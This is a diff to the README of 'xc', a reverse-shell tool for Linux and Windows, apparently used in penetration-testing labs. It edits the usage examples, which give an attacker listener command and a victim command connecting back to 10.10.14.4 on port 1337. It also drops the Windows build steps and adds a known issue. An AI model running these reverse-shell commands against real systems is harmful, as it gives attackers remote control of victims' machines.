@@ -68,8 +68,8 @@ Netcat like reverse shell for Linux & Windows. This is still experimental - pull
 
 ## Examples
 
-- Linux Attacker:	`xc -l -p 1337`			    (Server)
-- WindowsVictim :   `xc.exe 10.10.14.4 1337`	(Client)
+- Linux Attacker:	  `rlwrap xc -l -p 1337`			(Server)
+- WindowsVictim :   `xc.exe 10.10.14.4 1337`	  (Client)
 - Argumentless:     `xc_10.10.14.4_1337.exe`    (Client)
 
 ## Setup
@@ -81,12 +81,12 @@ go get github.com/hashicorp/yamux
 go get github.com/ropnop/go-clr
 ``` 
 
-Windows:
-```
-go build
-```
-
 Linux:
 ```
 make
 ```
+
+
+## Known Issues
+
+- You can not Ctrl+C out of !powershell (only !shell)
